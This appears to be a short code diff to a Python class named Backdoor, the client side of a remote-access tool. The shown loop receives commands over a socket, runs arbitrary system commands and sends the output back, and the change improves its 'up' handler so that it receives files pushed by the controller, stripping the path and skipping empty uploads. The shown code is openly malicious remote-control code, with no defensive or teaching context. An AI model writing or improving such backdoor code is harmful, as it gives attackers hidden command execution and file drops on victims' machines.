@@ -64,8 +64,11 @@ class Backdoor:
                     self.sd.send(result)
 
                 elif cmd_list[0]=='up' and len(cmd_list)>1:
-                    size = self.read_until_CRLF()
-                    self.receive_file(int(size), cmd_list[1])
+                    size = int(self.read_until_CRLF())
+    
+                    if size !=0:
+                        head, tail = os.path.split(cmd_list[1])
+                        self.receive_file(size, tail)
 
                 else:
                     result = self.execute_sys_cmd(command).decode()
